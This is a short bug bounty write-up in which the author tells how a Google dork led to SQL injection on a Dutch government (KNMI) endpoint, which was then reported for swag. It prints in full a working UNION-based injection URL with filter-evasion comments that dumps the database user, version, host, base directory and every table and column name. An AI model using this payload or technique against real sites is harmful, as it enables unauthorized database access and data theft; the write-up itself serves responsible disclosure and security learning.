---
title: "How I Found SQLI on Dutch Government Website in 20 Minutes"
published: true
ayout: post
categories: [bounty]
tags: [bounty,SQL Injection] 
---


## Introduction

Assalamu Alaikum! This is Nasur Ullah. I’m currently an undergrad student and a passionate Webapp security learner from Pakistan.

This is my first write-up and I’ll be sharing how I found SQL Injection Vulnerability on a Dutch government website.



## Story


It was a sunny afternoon in 2020, and I was mindlessly scrolling through my Facebook feed when a particular post caught my eye. It was from my friend [Remonsec](https://twitter.com/remonsec) from Bangladesh Remonsec mentioned the possibility of earning swag from Dutch government Intrigued, I reached out to Remonsec to tell me about scope of Dutch government and the scope was Wildcard so i directly use google dork `php id= site:.knmi.nl`  I was able to uncover several endpoints associated with `KNMI.nl` One such endpoint caught my attention: `https://eca.knmi.nl/utils/stationdetail.php?stationid=168` To assess its susceptibility to SQL injection, I inserted a single quote (') into the URL, prompting a site response that concealed certain images. This confirmed the presence of a SQL injection vulnerability.


Taking a manual approach, I endeavored to exploit the vulnerability further. After a few minutes of investigation and trial, I successfully executed an exploit, affirming the presence of the SQL injection flaw. I promptly reported my findings to `Dutch government` providing detailed information about the vulnerability and the steps to reproduce it.

## Final URL: ```https://eca.knmi.nl/utils/stationdetail.php?stationid=-168%27%20Union%20Select%20concat(%27%3Ccenter%3E%27,%27%3Cimg%20src=%22https://preview.ibb.co/mzji7p/39094260_106012140345838_338859137104347136_n.jpg%22%20height=%22300px%22%20width=%22300px%22%27,%27%3C/center%3E%27,%27%3C/br%3E%27,%27%3Cfont%20color=%22black%22%20size=%225%%22%3EInjected%20by%20.//D4RK%20!Nj3C70R++%27,%27%3C/font%3E%27,%27%3C/br%3E%27,%27%3Cfont%20color=%22red%22%3EUser::%20%20%20%20%20%20%27,user/**_**/(),%27%3C/br%3E%27,%27%3Cfont%20color=%22blue%22%3EVersion::%20%20%20%20%27,%27%3C/font%3E%27,version/**_**/(),%27%3Cbr%3E%27,%27%3Cfont%20color=%22green%22%3EDatabase::%20%20%20%27,%27%3C/font%3E%27,database/**_**/(),%27%3C/br%3E%27,%27%3Cfont%20color=%22blue%22%3EHost::%20%20%20%27,@@HOSTNAME,%27%3C/font%3E%27,%27%3C/br%3E%27,%27%3Cfont%20color=%22green%22%3EDirectory::%20%20%20%20%20%20%27,@@BASEDIR,%27%3C/font%3E%27,%27%3C/br%3E%27,%27%3Cfont%20color=%22blue%22%3ESymlink::%20%20%20%20%27,@@HAVE_SYMLINK,%27%3C/font%3E%27,%27%3C/br%3E%27,%27%3Cfont%20color=%22green%22%3ESSL::%20%20%20%27,@@HAVE_OPENSSL,%27%3C/font%3E%27,%27%3C/br%3E%27,%27%3C/br%3E%27,(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=database/**_**/())and(0x00)in(@x:=/*!50000coNcat*/%20(@x,0x3c62723e,/*!50000table_name*/,0x203a3a20,/*!50000column_name*/))))x)),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+```

I quickly made a proof of concept and reported it to them A one days later, I received an email from the Dutch government, thanking me for my contribution to their cybersecurity efforts. As a token of appreciation, they sent me a personalized package filled with swag, a tangible recognition of my valuable contribution.

![Remonsec](/assets/sqli/Remonsec.PNG)


## Key Takeaways

This experience underscores the effectiveness of employing Google dorking techniques, especially when dealing with wildcard scopes, to unearth potential vulnerabilities within target domains. Additionally, it emphasizes the importance of responsible disclosure and collaboration with security organizations to enhance online security.
